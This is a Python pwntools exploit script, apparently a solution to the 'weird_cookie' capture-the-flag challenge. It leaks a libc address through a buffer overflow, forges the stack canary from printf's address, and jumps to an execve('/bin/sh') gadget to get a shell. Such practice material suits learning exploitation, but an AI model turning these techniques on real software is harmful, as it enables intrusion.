#!/usr/bin/env python3

from pwn import *

exe = ELF("./weird_cookie_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)

p = process([exe.path])

p.recvuntil(b"Do you think you can overflow me?")
p.sendline(b"A" * 55)                                                     # padding until __libc_start_main address

p.recvline()
p.recvline()

leak = u64(p.recv(6).ljust(8, b"\x00"))
libc_base = leak - libc.symbols.__libc_start_main - 0xE7

p.recvuntil(b"Are you sure you overflowed it right? Try again.")

payload = b"A" * 40                                                       # padding until canary position
payload += p64(0x123456789ABCDEF1 ^ (libc_base + libc.symbols.printf))    # canary calculation
payload += b"A" * 8                                                       # padding until rip overwrite
payload += p64(libc_base + 0x10a2fc)                                      # gadget execve("/bin/sh")

p.sendline(payload)

p.interactive()

